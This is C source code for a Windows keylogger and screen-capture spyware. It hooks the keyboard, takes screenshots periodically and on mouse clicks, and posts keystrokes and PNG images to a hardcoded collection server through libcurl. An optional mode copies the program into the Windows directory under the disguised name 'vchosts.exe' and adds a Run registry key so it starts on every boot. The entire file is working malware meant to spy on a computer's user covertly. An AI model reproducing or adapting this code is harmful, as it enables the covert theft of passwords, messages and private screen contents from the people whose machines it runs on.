#include <stdio.h>
#include <time.h>
#include "curl/curl.h"
#include "lodepng.h"

#define BUFFERLEN 1024
#define SNAPSHOT_SEC 100
#define SERVER "http://192.168.1.100/send/send.php"
#define MALWARE 0

char *buffer;
unsigned int bufferIndex = 0;
unsigned int bufferSize = BUFFERLEN;
HANDLE mutex;
HHOOK hKeyHook, hMouseHook;

BOOL GetBMPScreen(HBITMAP bitmap, HDC bitmapDC, int width, int height, unsigned char** bufferOut, unsigned int* lengthOut)
{
	BOOL Success=FALSE;
	HDC SurfDC=NULL;
	HBITMAP OffscrBmp=NULL;
	HDC OffscrDC=NULL;
	LPBITMAPINFO lpbi=NULL;
	LPVOID lpvBits=NULL;
	HANDLE BmpFile=INVALID_HANDLE_VALUE;
	BITMAPFILEHEADER bmfh;

	if ((OffscrBmp = CreateCompatibleBitmap(bitmapDC, width, height)) == NULL)
		return FALSE;

	if ((OffscrDC = CreateCompatibleDC(bitmapDC)) == NULL)
		return FALSE;

	HBITMAP OldBmp = (HBITMAP)SelectObject(OffscrDC, OffscrBmp);
	BitBlt(OffscrDC, 0, 0, width, height, bitmapDC, 0, 0, SRCCOPY);
	lpbi = (LPBITMAPINFO)malloc(sizeof(BITMAPINFOHEADER) + 256 * sizeof(RGBQUAD));

	ZeroMemory(&lpbi->bmiHeader, sizeof(BITMAPINFOHEADER));
	lpbi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

	SelectObject(OffscrDC, OldBmp);
	if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, NULL, lpbi, DIB_RGB_COLORS))
		return FALSE;

	lpvBits = malloc(lpbi->bmiHeader.biSizeImage);

	if (!GetDIBits(OffscrDC, OffscrBmp, 0, height, lpvBits, lpbi, DIB_RGB_COLORS))
		return FALSE;

	int h = height;
	int w = width;
	unsigned scanlineBytes = w * 4;
	if(scanlineBytes % 4 != 0) scanlineBytes = (scanlineBytes / 4) * 4 + 4;

	char *png = malloc(w * h * 4);
	int x,y;

	for(y = 0; y < h; y++)
		for(x = 0; x < w; x++)
		{
			unsigned bmpos = (h - y - 1) * scanlineBytes + 4 * x;
			unsigned newpos = 4 * y * w + 4 * x;

			png[newpos + 0] = ((char *)lpvBits)[bmpos + 2]; //R
			png[newpos + 1] = ((char *)lpvBits)[bmpos + 1]; //G
			png[newpos + 2] = ((char *)lpvBits)[bmpos + 0]; //B
			png[newpos + 3] = 255;            //A
		}

	free(lpvBits);
	lodepng_encode32_memory(png, width, height, bufferOut, lengthOut);
	free(png);

	return TRUE;
}

int FileSend(char *data, int length)
{
	FILE *log;
	log = fopen("log","a+");
	fprintf(log, "%*s", length, data);
	fclose(log);

	return 1;
}

int CurlSend(char *data, int length, char *postParamName)
{
	CURL *curl;
	CURLcode res;

	curl_global_init(CURL_GLOBAL_ALL);
	curl = curl_easy_init();
	res = CURLE_OK;

	if(curl)
	{
		char *inputStr = postParamName;
		char *httpStr = curl_easy_escape(curl, data, length);

		char *sendStr = (char *)malloc(strlen(inputStr) + strlen(httpStr) + 1);
		strcpy(sendStr, inputStr);
		strcat(sendStr, httpStr);

		curl_easy_setopt(curl, CURLOPT_URL, SERVER);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendStr);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);

		curl_free(httpStr);
		free(sendStr);
	}

	curl_global_cleanup();

	if(res == CURLE_OK)
	{
		return 1;
	}

	return 0;
}

void ConvertKey(unsigned int key, char *outStr)
{
	BYTE keyboardState[256];
	WORD out;
	GetKeyboardState(keyboardState);
	int res = ToAsciiEx(key, MapVirtualKeyEx(key, 0, GetKeyboardLayout(0)), keyboardState, &out, 0, GetKeyboardLayout(0));

	if(res == 1)
	{
		outStr[0] = out & 0xff;
		outStr[1] = 0;
	}
	if(res == 2)
	{
		outStr[0] = out & 0xff;
		outStr[1] = (out >> 8) & 0xff;
		outStr[2] = 0;
	}
}

void SaveKey(unsigned int key)
{
	char keyStr[16];
	ConvertKey(key, keyStr);

	// lock
	WaitForSingleObject(mutex, INFINITE);

	int len = strlen(buffer);
	int available = bufferSize - len;

	if (strlen(keyStr) >= available)
	{
		bufferSize *= 2;
		buffer = realloc(buffer, bufferSize);
	}

	strcat(buffer, keyStr);

	// unlock
	ReleaseMutex(mutex);
}

void SendScreenshot()
{
	HDC hDc = CreateCompatibleDC(0);
	int width = GetDeviceCaps(hDc, HORZRES);
	int height = GetDeviceCaps(hDc, VERTRES);
	HBITMAP hBmp = CreateCompatibleBitmap(GetDC(0), width, height);
	SelectObject(hDc, hBmp);
	BitBlt(hDc, 0, 0, width, height, GetDC(0), 0, 0, SRCCOPY);

	unsigned char *image;
	unsigned int len;

	BOOL ret = GetBMPScreen(hBmp, hDc, width, height, &image, &len);

	DeleteObject(hBmp);
	DeleteObject(hDc);

	CurlSend(image, len, "image=");
	lodepng_memory_free(image);
}

LRESULT CALLBACK RawInputMouse(int nCode, WPARAM wParam, LPARAM lParam)
{
	MOUSEHOOKSTRUCT *mouse = (MOUSEHOOKSTRUCT *)lParam;

	if (nCode == HC_ACTION && wParam == WM_LBUTTONDOWN)
	{
		SendScreenshot();
	}

	return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

LRESULT CALLBACK RawInputKeyboard(int nCode, WPARAM wParam, LPARAM lParam)
{
	if(nCode < 0)
		return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
	
	if(wParam == WM_KEYDOWN)
	{
		KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;
		SaveKey(keyboard->vkCode);
	}

	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyLogger()
{
	HINSTANCE hExe = GetModuleHandle(NULL);
	//hMouseHook = SetWindowsHookEx(WH_MOUSE_LL,(HOOKPROC)RawInputMouse, hExe, 0);
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL,(HOOKPROC)RawInputKeyboard, hExe, 0);
	MSG msg;
	
	//Loop infinito, per uscire da qui si può solo fare
	//PostThreadMessage("ID DEL THREAD", WM_QUIT, 0, 0);
	GetMessage(&msg, NULL, 0, 0);

	return 0;
}

void Hook(char* self, int mode)
{
	unsigned char path[1024];
	int err;
	HKEY hkey;
	FILE *test;

	GetWindowsDirectory(path, 1024);
	strcat(path, "\\vchosts.exe");

	CopyFile(self, path, 0);

	RegCreateKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey,"wincmd32", 0, REG_SZ, path, strlen(path));
	RegCloseKey(hkey);

	return;
}

int main(int argn, char* argv[])
{
	if(MALWARE)
	{
		unsigned char path[1024];
		GetWindowsDirectory(path, 1024);
		strcat(path, "\\vchosts.exe");

		WIN32_FIND_DATA FindFileData;
		HANDLE handle = FindFirstFile(path, &FindFileData);
		if(handle == INVALID_HANDLE_VALUE)
		{
			FindClose(handle);
			Hook(argv[0], 1);
			ShellExecute(0, "open", path, NULL, NULL, SW_SHOW);
			exit(0);
		}

		if(strstr(argv[0], "vchosts") == 0)
		{
			exit(0);
		}
	}

	mutex = CreateMutex(NULL, FALSE, NULL);

	buffer = (char*)malloc(BUFFERLEN);
	buffer[0] = 0;

	HANDLE logger;
	logger = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);

	unsigned int timer = 0;
	int len;

	while(1)
	{
		if(timer % SNAPSHOT_SEC == 0)
		{
			SendScreenshot();
		}

		if(timer % 10 == 0)
		{
			// lock
			WaitForSingleObject(mutex, INFINITE);

			len = strlen(buffer);
			char *curlTmp = malloc(len);
			memcpy(curlTmp, buffer, len);

			// unlock
			ReleaseMutex(mutex);

			int res = CurlSend(curlTmp, len, "text=");
			if(res)
			{
				// lock
				WaitForSingleObject(mutex, INFINITE);

				// reset buffer
				strcpy(buffer, buffer + len);

				// unlock
				ReleaseMutex(mutex);
			}
			
			// lock
			WaitForSingleObject(mutex, INFINITE);

			free(curlTmp);

			// unlock
			ReleaseMutex(mutex);			
		}
		timer++;
		Sleep(1000); // 1 sec sleep
	}
	return 0;
}
